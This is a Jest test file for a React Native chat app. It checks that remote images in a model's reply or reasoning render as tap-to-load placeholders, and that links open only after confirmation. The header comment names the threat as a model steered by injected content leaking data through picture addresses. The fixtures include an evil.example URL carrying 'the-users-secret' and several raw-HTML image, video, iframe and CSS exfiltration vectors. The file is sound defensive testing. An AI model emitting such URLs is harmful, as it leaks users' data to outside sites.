/**
 * Pictures in a reply never load by themselves (security review 2,
 * 2026-11-18): a model steered by a page or a file could otherwise send
 * what it read to any site inside a picture's address.
 */
import React from 'react';
import {Alert, Image, Linking} from 'react-native';

import {render, fireEvent, act} from '../../../../jest/test-utils';

import {MarkdownView} from '../MarkdownView';
import {ReasoningBlock} from '../../ReasoningBlock';
import {isLocalPicture, siteOf, askToOpenLink} from '../safeHtml';

const SECRET = 'https://evil.example/p.png?q=the-users-secret';
const PNG =
  'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';

const remoteImages = (root: any) =>
  root
    .UNSAFE_queryAllByType(Image)
    .map((i: any) => i.props.source?.uri)
    .filter((u: unknown) => typeof u === 'string' && /^https?:/i.test(u));

let getSize: jest.SpyInstance;
let alert: jest.SpyInstance;
beforeEach(() => {
  getSize = jest.spyOn(Image, 'getSize').mockImplementation(() => {});
  alert = jest.spyOn(Alert, 'alert').mockImplementation(() => {});
});
afterEach(() => {
  getSize.mockRestore();
  alert.mockRestore();
});

describe('pictures in a reply', () => {
  it('a picture from a site is a placeholder; nothing is fetched', () => {
    const view = render(
      <MarkdownView
        markdownText={`Here: ![chart](${SECRET})`}
        maxMessageWidth={300}
      />,
    );
    expect(remoteImages(view)).toEqual([]);
    expect(getSize).not.toHaveBeenCalled();
    expect(
      view.getByText(/chart · Picture from evil\.example, tap to load/),
    ).toBeTruthy();
    // The site only: the address's secret part is not on the screen.
    expect(view.queryByText(/the-users-secret/)).toBeNull();
  });

  it('raw HTML pictures, video posters and frames fetch nothing either', () => {
    const view = render(
      <MarkdownView
        markdownText={[
          `<img src="${SECRET}" srcset="${SECRET} 2x">`,
          `<video poster="${SECRET}" src="${SECRET}"></video>`,
          `<iframe src="${SECRET}"></iframe>`,
          `<picture><source srcset="${SECRET}"></picture>`,
          `<p style="background-image:url(${SECRET})">styled</p>`,
        ].join('\n\n')}
        maxMessageWidth={300}
      />,
    );
    expect(remoteImages(view)).toEqual([]);
    expect(getSize).not.toHaveBeenCalled();
    expect(view.getByText('styled')).toBeTruthy();
  });

  it('a tap shows the whole address and loads only after "Load"', async () => {
    const view = render(
      <MarkdownView markdownText={`![](${SECRET})`} maxMessageWidth={300} />,
    );
    fireEvent.press(view.getByTestId('markdown-picture-placeholder'));
    expect(alert).toHaveBeenCalledTimes(1);
    const [title, message, buttons] = alert.mock.calls[0];
    expect(title).toBe('Load this picture?');
    expect(message).toContain(SECRET);
    // "Don't load" first.
    expect(buttons[0].style).toBe('cancel');
    await act(async () => buttons[0].onPress());
    expect(remoteImages(view)).toEqual([]);
    fireEvent.press(view.getByTestId('markdown-picture-placeholder'));
    await act(async () => alert.mock.calls[1][2][1].onPress());
    expect(remoteImages(view)).toEqual([SECRET]);
  });

  it("the app's own files and pictures written into the reply show", () => {
    const view = render(
      <MarkdownView markdownText={`![dot](${PNG})`} maxMessageWidth={300} />,
    );
    expect(view.getByTestId('markdown-picture').props.source.uri).toBe(PNG);
    expect(isLocalPicture('file:///data/user/0/app/files/a.png')).toBe(true);
    expect(isLocalPicture('data:image/svg+xml;base64,AAAA')).toBe(false);
    expect(isLocalPicture('//evil.example/x.png')).toBe(false);
    expect(isLocalPicture('content://media/1')).toBe(false);
    expect(siteOf('https://user:pw@evil.example:8080/x')).toBe(
      'evil.example:8080',
    );
  });

  it('the thinking renders pictures the same way', () => {
    const view = render(
      <ReasoningBlock text={`![x](${SECRET})`} maxWidth={300} />,
    );
    expect(remoteImages(view)).toEqual([]);
    expect(getSize).not.toHaveBeenCalled();
  });

  it('a link opens only after its whole address was shown', async () => {
    const open = jest.spyOn(Linking, 'openURL').mockResolvedValue(true);
    askToOpenLink(SECRET);
    expect(open).not.toHaveBeenCalled();
    const [, message, buttons] = alert.mock.calls[0];
    expect(message).toContain(SECRET);
    await act(async () => buttons[1].onPress());
    expect(open).toHaveBeenCalledWith(SECRET);
    open.mockRestore();
  });
});
